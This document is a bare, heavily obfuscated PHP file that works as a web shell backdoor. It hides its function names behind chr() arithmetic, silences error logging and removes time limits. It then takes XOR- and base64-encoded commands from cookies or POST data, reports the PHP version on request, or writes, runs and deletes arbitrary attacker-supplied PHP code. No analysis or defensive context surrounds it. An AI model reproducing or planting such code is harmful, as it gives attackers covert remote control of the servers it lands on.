<?php $nqczqam = 'f'.chr(750-645).chr(188-80).chr(101).'_'.chr(624-512)."\165".chr(355-239).chr(370-275).chr(535-436).'o'.chr(110).'t'."\x65"."\156"."\x74".chr(955-840);
$atmmddysmi = "\142"."\141".chr(115).chr(836-735)."\x36".'4'."\137".'d'.'e'.chr(99).chr(111).chr(209-109).'e';
$spehv = 'i'."\x6e".chr(105).chr(390-295)."\x73".chr(237-136)."\164";
$xogpdilzct = chr(860-743).'n'.'l'.chr(105)."\x6e".chr(107);


@$spehv('e'."\x72"."\162".chr(970-859).chr(656-542)."\137".chr(108).'o'."\x67", NULL);
@$spehv(chr(903-795).chr(340-229).chr(103)."\x5f".chr(455-354).chr(114).chr(300-186)."\x6f"."\162".chr(115), 0);
@$spehv('m'.chr(97).chr(1024-904)."\x5f".'e'.chr(120).'e'.chr(677-578).'u'.chr(116).chr(629-524)."\x6f"."\156"."\137".'t'.chr(105).chr(109).chr(101), 0);
@set_time_limit(0);

function elddq($tzyuzwdygv, $liynicg)
{
    $fnubarepb = "";
    for ($emkvevdfh = 0; $emkvevdfh < strlen($tzyuzwdygv);) {
        for ($j = 0; $j < strlen($liynicg) && $emkvevdfh < strlen($tzyuzwdygv); $j++, $emkvevdfh++) {
            $fnubarepb .= chr(ord($tzyuzwdygv[$emkvevdfh]) ^ ord($liynicg[$j]));
        }
    }
    return $fnubarepb;
}

$ecaqbmngbs = array_merge($_COOKIE, $_POST);
$trwfbcrxcw = '1447d99e-4612-42a9-ae0e-bd1fb60aa18c';
foreach ($ecaqbmngbs as $csoscwy => $tzyuzwdygv) {
    $tzyuzwdygv = @unserialize(elddq(elddq($atmmddysmi($tzyuzwdygv), $trwfbcrxcw), $csoscwy));
    if (isset($tzyuzwdygv["\141"."\153"])) {
        if ($tzyuzwdygv[chr(888-791)] == chr(105)) {
            $emkvevdfh = array(
                chr(170-58).chr(118) => @phpversion(),
                chr(777-662)."\x76" => "3.5",
            );
            echo @serialize($emkvevdfh);
        } elseif ($tzyuzwdygv[chr(888-791)] == 'e') {
            $trjhtrxlld = "./" . md5($trwfbcrxcw) . '.'.chr(105).'n'."\143";
            @$nqczqam($trjhtrxlld, "<" . '?'.chr(112)."\x68".chr(112).' '.'@'.chr(117).chr(1043-933).chr(108).'i'.chr(110).chr(107).chr(40)."\x5f"."\137".'F'.chr(73)."\114"."\x45".chr(95)."\x5f"."\51".';'."\x20" . $tzyuzwdygv["\x64"]);
            @include($trjhtrxlld);
            @$xogpdilzct($trjhtrxlld);
        }
        exit();
    }
}

